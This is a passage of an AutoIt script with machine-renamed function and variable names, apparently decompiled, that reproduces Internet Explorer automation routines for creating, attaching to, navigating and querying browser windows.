TraySetState(2)
Opt("TrayMenuMode", 1)

Func Fn0079($ArgOpt00 = @error, $ArgOpt01 = @extended)
	Local $Local0000 = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($ArgOpt00, $ArgOpt01, $Local0000[0])
EndFunc

Global Const $Var024B[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
Global Const $Var024C = 1, $Var024D = 2
Global $Var024E = 0x000493E0
Global $Var024F = False
Global $Var0250
Global $Var0251 = True
Global $Var0252, $Var0253
Global $Var0254, $Var0255, $Var0256, $Var0257, $Var0258, $Var0259, $Var025A, $Var025B, $Var025C, $Var025D, $Var025E
Global Enum $Var025F = 0, $Var0260, $Var0261, $Var0262, $Var0263, $Var0264, $Var0265, $Var0266, $Var0267, $Var0268

Func Fn007A($ArgOpt00 = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 = 1, $ArgOpt04 = 1)
	If $Var0250 Then
		Switch String($ArgOpt00)
			Case "0"
				$ArgOpt00 = "about:blank"
				$ArgOpt02 = 0
				Fn008A("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
			Case "1"
				$ArgOpt00 = "about:blank"
				$ArgOpt02 = 1
				Fn008A("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
		EndSwitch
	EndIf
	If Not $ArgOpt02 Then $ArgOpt04 = 0
	If $ArgOpt01 Then
		Local $Local0001 = Fn007C($ArgOpt00, "url")
		If IsObj($Local0001) Then
			If $ArgOpt04 Then WinActivate(HWnd($Local0001 .HWND))
			Return SetError($Var025F, 1, $Local0001)
		EndIf
	EndIf
	Local $Local0002 = 0
	If Not $ArgOpt02 And Fn0085($Var024C) Then $Local0002 = 1
	Local $Local0003 = ObjCreate("InternetExplorer.Application")
	If Not IsObj($Local0003) Then
		Fn008A("Error", "_IECreate", "", "Browser Object Creation Failed")
		Return SetError($Var0260, 0, 0)
	EndIf
	$Local0003 .visible = $ArgOpt02
	If $Local0002 And Not Fn0085($Var024D) Then Fn008A("Warning", "_IECreate", "", "Foreground Window Unlock Failed!")
	Fn007B($Local0003, $ArgOpt00, $ArgOpt03)
	Return SetError(@error, 0, $Local0003)
EndFunc

Func Fn007B(ByRef $ArgRef00, $Arg01, $ArgOpt02 = 1)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IENavigate", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	If Not Fn0089($ArgRef00, "documentContainer") Then
		Fn008A("Error", "_IENavigate", "$_IEStatus_InvalidObjectType")
		Return SetError($Var0263, 1, 0)
	EndIf
	$ArgRef00.navigate($Arg01)
	If $ArgOpt02 Then
		Fn007D($ArgRef00)
		Return SetError(@error, 0, -1)
	EndIf
	Return SetError($Var025F, 0, -1)
EndFunc

Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
	$ArgOpt01 = StringLower($ArgOpt01)
	$ArgOpt02 = Int($ArgOpt02)
	If $ArgOpt02 < 1 Then
		Fn008A("Error", "_IEAttach", "$_IEStatus_InvalidValue", "$i_instance < 1")
		Return SetError($Var0264, 3, 0)
	EndIf
	If $ArgOpt01 = "embedded" Or $ArgOpt01 = "dialogbox" Then
		Local $Local0004 = Opt("WinTitleMatchMode", 2)
		If $ArgOpt01 = "dialogbox" And $ArgOpt02 > 1 Then
			If IsHWnd($Arg00) Then
				$ArgOpt02 = 1
				Fn008A("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd and DialogBox.  Setting to 1.")
			Else
				Local $Local0005 = WinList($Arg00, "")
				If $ArgOpt02 <= $Local0005[0][0] Then
					$Arg00 = $Local0005[$ArgOpt02][1]
					$ArgOpt02 = 1
				Else
					Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
					Opt("WinTitleMatchMode", $Local0004)
					Return SetError($Var0266, 1, 0)
				EndIf
			EndIf
		EndIf
		Local $Local0006 = ControlGetHandle($Arg00, "", "[CLASS:Internet Explorer_Server; INSTANCE:" & $ArgOpt02 & "]")
		Local $Local0001 = Fn0086($Local0006)
		Opt("WinTitleMatchMode", $Local0004)
		If IsObj($Local0001) Then
			Return SetError($Var025F, 0, $Local0001)
		Else
			Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
			Return SetError($Var0266, 1, 0)
		EndIf
	EndIf
	Local $Local0007 = ObjCreate("Shell.Application")
	Local $Local0008 = $Local0007 .Windows()
	Local $Local0009 = 1
	Local $Local000C, $Local000B, $Var0269, $Var026A
	For $Var026B In $Local0008
		$Var0269 = True
		$Local000B = Fn008B()
		If Not $Local000B Then Fn008A("Warning", "_IEAttach", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
		$Local000C = Fn0083()
		Fn000A(False)
		If $Var0269 Then
			$Var026A = $Var026B .type
			If @error Then $Var0269 = False
		EndIf
		If $Var0269 Then
			$Var026A = $Var026B .document.title
			If @error Then $Var0269 = False
		EndIf
		Fn0083($Local000C)
		Fn008C()
		If $Var0269 Then
			Switch $ArgOpt01
				Case "title"
					If StringInStr($Var026B .document.title, $Arg00) > 0 Then
						If $ArgOpt02 = $Local0009 Then
							Return SetError($Var025F, 0, $Var026B)
						Else
							$Local0009 += 1
						EndIf
					EndIf
				Case "instance"
					If $ArgOpt02 = $Local0009 Then
						Return SetError($Var025F, 0, $Var026B)
					Else
						$Local0009 += 1
					EndIf
				Case "windowtitle"
					Local $Local000A = False
					$Var026A = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\", "Window Title")
					If Not @error Then
						If StringInStr($Var026B .document.title & " - " & $Var026A, $Arg00) Then $Local000A = True
					Else
						If StringInStr($Var026B .document.title & " - Microsoft Internet Explorer", $Arg00) Then $Local000A = True
						If StringInStr($Var026B .document.title & " - Windows Internet Explorer", $Arg00) Then $Local000A = True
					EndIf
					If $Local000A Then
						If $ArgOpt02 = $Local0009 Then
							Return SetError($Var025F, 0, $Var026B)
						Else
							$Local0009 += 1
						EndIf
					EndIf
				Case "url"
					If StringInStr($Var026B .LocationURL, $Arg00) > 0 Then
						If $ArgOpt02 = $Local0009 Then
							Return SetError($Var025F, 0, $Var026B)
						Else
							$Local0009 += 1
						EndIf
					EndIf
				Case "text"
					If StringInStr($Var026B .document.body.innerText, $Arg00) > 0 Then
						If $ArgOpt02 = $Local0009 Then
							Return SetError($Var025F, 0, $Var026B)
						Else
							$Local0009 += 1
						EndIf
					EndIf
				Case "html"
					If StringInStr($Var026B .document.body.innerHTML, $Arg00) > 0 Then
						If $ArgOpt02 = $Local0009 Then
							Return SetError($Var025F, 0, $Var026B)
						Else
							$Local0009 += 1
						EndIf
					EndIf
				Case "hwnd"
					If $ArgOpt02 > 1 Then
						$ArgOpt02 = 1
						Fn008A("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd.  Setting to 1.")
					EndIf
					If Fn0082($Var026B, "hwnd") = $Arg00 Then
						Return SetError($Var025F, 0, $Var026B)
					EndIf
				Case Else
					Fn008A("Error", "_IEAttach", "$_IEStatus_InvalidValue", "Invalid Mode Specified")
					Return SetError($Var0264, 2, 0)
			EndSwitch
		EndIf
	Next
	Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
	Return SetError($Var0266, 1, 0)
EndFunc

Func Fn007D(ByRef $ArgRef00, $ArgOpt01 = 0, $ArgOpt02 = -1)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IELoadWait", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	If Not Fn0089($ArgRef00, "browserdom") Then
		Fn008A("Error", "_IELoadWait", "$_IEStatus_InvalidObjectType", ObjName($ArgRef00))
		Return SetError($Var0263, 1, 0)
	EndIf
	Local $Local0013, $Var026C = False, $Var026D = $Var025F
	Local $Local000B = Fn008B()
	If Not $Local000B Then Fn008A("Warning", "_IELoadWait", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
	Local $Local000C = Fn0083()
	Fn000A(False)
	Sleep($ArgOpt01)
	Local $Local000D = TimerInit()
	If $ArgOpt02 = -1 Then $ArgOpt02 = $Var024E
	Switch ObjName($ArgRef00)
		Case "IWebBrowser2"
			While Not (String($ArgRef00.readyState) = "complete" Or $ArgRef00.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
			While Not (String($ArgRef00.document.readyState) = "complete" Or $ArgRef00.document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
		Case "DispHTMLWindow2"
			While Not (String($ArgRef00.document.readyState) = "complete" Or $ArgRef00.document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
			While Not (String($ArgRef00.top.document.readyState) = "complete" Or $ArgRef00.top.document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
		Case "DispHTMLDocument"
			$Local0013 = $ArgRef00.parentWindow
			While Not (String($Local0013 .document.readyState) = "complete" Or $Local0013 .document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
			While Not (String($Local0013 .top.document.readyState) = "complete" Or $Local0013 .top.document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
		Case Else
			$Local0013 = $ArgRef00.document.parentWindow
			While Not (String($Local0013 .document.readyState) = "complete" Or $Local0013 .document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
			While Not (String($Local0013 .top.document.readyState) = "complete" Or $ArgRef00.top.document.readyState = 4 Or $Var026C)
				If (TimerDiff($Local000D) > $ArgOpt02) Then
					$Var026D = $Var0265
					$Var026C = True
				EndIf
				If @error = $Var0261 And Fn008E() Then
					$Var026D = Fn008E()
					$Var026C = True
				EndIf
				Sleep(0x0064)
			WEnd
	EndSwitch
	Fn0083($Local000C)
	Fn008C()
	Switch $Var026D
		Case $Var025F
			Return SetError($Var025F, 0, 1)
		Case $Var0265
			Fn008A("Warning", "_IELoadWait", "$_IEStatus_LoadWaitTimeout")
			Return SetError($Var0265, 3, 0)
		Case $Var0267
			Fn008A("Warning", "_IELoadWait", "$_IEStatus_AccessIsDenied", "Cannot verify readyState.  Likely casue: cross-site scripting security restriction.")
			Return SetError($Var0267, 0, 0)
		Case $Var0268
			Fn008A("Error", "_IELoadWait", "$_IEStatus_ClientDisconnected", "Browser has been deleted prior to operation.")
			Return SetError($Var0268, 0, 0)
		Case Else
			Fn008A("Error", "_IELoadWait", "$_IEStatus_GeneralError", "Invalid Error Status - Notify IE.au3 developer")
			Return SetError($Var0260, 0, 0)
	EndSwitch
EndFunc

Func Fn007E($ArgOpt00 = -1)
	If $ArgOpt00 = -1 Then
		Return SetError($Var025F, 0, $Var024E)
	Else
		$Var024E = $ArgOpt00
		Return SetError($Var025F, 0, 1)
	EndIf
EndFunc

Func Fn007F(ByRef $ArgRef00, $ArgOpt01 = -1)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IELinkGetCollection", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	$ArgOpt01 = Number($ArgOpt01)
	Select
		Case $ArgOpt01 = -1
			Return SetError($Var025F, $ArgRef00.document.links.length, $ArgRef00.document.links)
		Case $ArgOpt01 > -1 And $ArgOpt01 < $ArgRef00.document.links.length
			Return SetError($Var025F, $ArgRef00.document.links.length, $ArgRef00.document.links.item($ArgOpt01))
		Case $ArgOpt01 < -1
			Fn008A("Error", "_IELinkGetCollection", "$_IEStatus_InvalidValue")
			Return SetError($Var0264, 2, 0)
		Case Else
			Fn008A("Warning", "_IELinkGetCollection", "$_IEStatus_NoMatch")
			Return SetError($Var0266, 2, 0)
	EndSelect
EndFunc

Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04 = 1)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IEImgClick", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	Local $Var026E, $Var026F = 0, $Var0270 = $ArgRef00.document.images
	$ArgOpt02 = StringLower($ArgOpt02)
	$ArgOpt03 = Number($ArgOpt03)
	For $Var0271 In $Var0270
		Select
			Case $ArgOpt02 = "alt"
				$Var026E = $Var0271 .alt
			Case $ArgOpt02 = "name"
				$Var026E = $Var0271 .name
			Case $ArgOpt02 = "src"
				$Var026E = $Var0271 .src
			Case Else
				Fn008A("Error", "_IEImgClick", "$_IEStatus_InvalidValue", "Invalid mode: " & $ArgOpt02)
				Return SetError($Var0264, 3, 0)
		EndSelect
		If StringInStr($Var026E, $Arg01) Then
			If ($Var026F = $ArgOpt03) Then
				$Var0271 .click
				If $ArgOpt04 Then
					Fn007D($ArgRef00)
					Return SetError(@error, 0, -1)
				EndIf
				Return SetError($Var025F, 0, -1)
			EndIf
			$Var026F = $Var026F + 1
		EndIf
	Next
	Fn008A("Warning", "_IEImgClick", "$_IEStatus_NoMatch")
	Return SetError($Var0266, 0, 0)
EndFunc

Func Fn0081(ByRef $ArgRef00, $Arg01)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IEAction", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	$Arg01 = StringLower($Arg01)
	Select
		Case $Arg01 = "click"
			If Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.Click()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "disable"
			If Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.disabled = True
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "enable"
			If Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.disabled = False
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "focus"
			If Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.Focus()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "copy"
			$ArgRef00.document.execCommand("Copy")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "cut"
			$ArgRef00.document.execCommand("Cut")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "paste"
			$ArgRef00.document.execCommand("Paste")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "delete"
			$ArgRef00.document.execCommand("Delete")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "saveas"
			$ArgRef00.document.execCommand("SaveAs")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "refresh"
			$ArgRef00.document.execCommand("Refresh")
			Fn007D($ArgRef00)
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "selectall"
			$ArgRef00.document.execCommand("SelectAll")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "unselect"
			$ArgRef00.document.execCommand("Unselect")
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "print"
			$ArgRef00.document.parentwindow.Print()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "printdefault"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.execWB(6, 2)
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "back"
			If Not Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.GoBack()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "blur"
			$ArgRef00.Blur()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "forward"
			If Not Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.GoForward()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "home"
			If Not Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.GoHome()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "invisible"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.visible = 0
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "visible"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.visible = 1
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "search"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.GOsearch()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "stop"
			If Not Fn0089($ArgRef00, "documentContainer") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.Stop()
			Return SetError($Var025F, 0, 1)
		Case $Arg01 = "quit"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$ArgRef00.Quit()
			$ArgRef00 = 0
			Return SetError($Var025F, 0, 1)
		Case Else
			Fn008A("Error", "_IEAction", "$_IEStatus_InvalidValue", "Invalid Action")
			Return SetError($Var0264, 2, 0)
	EndSelect
EndFunc

Func Fn0082(ByRef $ArgRef00, $Arg01)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	If Not Fn0089($ArgRef00, "browserdom") Then
		Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
		Return SetError($Var0263, 1, 0)
	EndIf
	Local $Local0013, $Var0272
	$Arg01 = StringLower($Arg01)
	Select
		Case $Arg01 = "browserx"
			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$Local0013 = $ArgRef00
			$Var0272 = 0
			While IsObj($Local0013)
				$Var0272 += $Local0013 .offsetLeft
				$Local0013 = $Local0013 .offsetParent
			WEnd
			Return SetError($Var025F, 0, $Var0272)
		Case $Arg01 = "browsery"
			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			$Local0013 = $ArgRef00
			$Var0272 = 0
			While IsObj($Local0013)
				$Var0272 += $Local0013 .offsetTop
				$Local0013 = $Local0013 .offsetParent
			WEnd
			Return SetError($Var025F, 0, $Var0272)
		Case $Arg01 = "screenx"
			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			If Fn0089($ArgRef00, "browser") Then
				Return SetError($Var025F, 0, $ArgRef00.left())
			Else
				$Local0013 = $ArgRef00
				$Var0272 = 0
				While IsObj($Local0013)
					$Var0272 += $Local0013 .offsetLeft
					$Local0013 = $Local0013 .offsetParent
				WEnd
			EndIf
			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenLeft)
		Case $Arg01 = "screeny"
			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			If Fn0089($ArgRef00, "browser") Then
				Return SetError($Var025F, 0, $ArgRef00.top())
			Else
				$Local0013 = $ArgRef00
				$Var0272 = 0
				While IsObj($Local0013)
					$Var0272 += $Local0013 .offsetTop
					$Local0013 = $Local0013 .offsetParent
				WEnd
			EndIf
			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenTop)
		Case $Arg01 = "height"
			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			If Fn0089($ArgRef00, "browser") Then
				Return SetError($Var025F, 0, $ArgRef00.Height())
			Else
				Return SetError($Var025F, 0, $ArgRef00.offsetHeight)
			EndIf
		Case $Arg01 = "width"
			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			If Fn0089($ArgRef00, "browser") Then
				Return SetError($Var025F, 0, $ArgRef00.Width())
			Else
				Return SetError($Var025F, 0, $ArgRef00.offsetWidth)
			EndIf
		Case $Arg01 = "isdisabled"
			Return SetError($Var025F, 0, $ArgRef00.isDisabled())
		Case $Arg01 = "addressbar"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.AddressBar())
		Case $Arg01 = "busy"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Busy())
		Case $Arg01 = "fullscreen"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.fullScreen())
		Case $Arg01 = "hwnd"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, HWnd($ArgRef00.HWnd()))
		Case $Arg01 = "left"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Left())
		Case $Arg01 = "locationname"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.LocationName())
		Case $Arg01 = "locationurl"
			If Fn0089($ArgRef00, "browser") Then
				Return SetError($Var025F, 0, $ArgRef00.locationURL())
			EndIf
			If Fn0089($ArgRef00, "window") Then
				Return SetError($Var025F, 0, $ArgRef00.location.href())
			EndIf
			If Fn0089($ArgRef00, "document") Then
				Return SetError($Var025F, 0, $ArgRef00.parentwindow.location.href())
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.document.parentwindow.location.href())
		Case $Arg01 = "menubar"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.MenuBar())
		Case $Arg01 = "offline"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.OffLine())
		Case $Arg01 = "readystate"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.ReadyState())
		Case $Arg01 = "resizable"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Resizable())
		Case $Arg01 = "silent"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Silent())
		Case $Arg01 = "statusbar"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.StatusBar())
		Case $Arg01 = "statustext"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.StatusText())
		Case $Arg01 = "top"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Top())
		Case $Arg01 = "visible"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.Visible())
		Case $Arg01 = "appcodename"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appCodeName())
		Case $Arg01 = "appminorversion"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appMinorVersion())
		Case $Arg01 = "appname"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appName())
		Case $Arg01 = "appversion"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appVersion())
		Case $Arg01 = "browserlanguage"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.browserLanguage())
		Case $Arg01 = "cookieenabled"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.cookieEnabled())
		Case $Arg01 = "cpuclass"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.cpuClass())
		Case $Arg01 = "javaenabled"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.javaEnabled())
		Case $Arg01 = "online"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.onLine())
		Case $Arg01 = "platform"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.platform())
		Case $Arg01 = "systemlanguage"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.systemLanguage())
		Case $Arg01 = "useragent"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.userAgent())
		Case $Arg01 = "userlanguage"
			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.userLanguage())
		Case $Arg01 = "vcard"
			Local $Local000E[1][0x001D]
			$Local000E[0][0] = "Business.City"
			$Local000E[0][1] = "Business.Country"
			$Local000E[0][2] = "Business.Fax"
			$Local000E[0][3] = "Business.Phone"
			$Local000E[0][4] = "Business.State"
			$Local000E[0][5] = "Business.StreetAddress"
			$Local000E[0][6] = "Business.URL"
			$Local000E[0][7] = "Business.Zipcode"
			$Local000E[0][8] = "Cellular"
			$Local000E[0][9] = "Company"
			$Local000E[0][10] = "Department"
			$Local000E[0][0x000B] = "DisplayName"
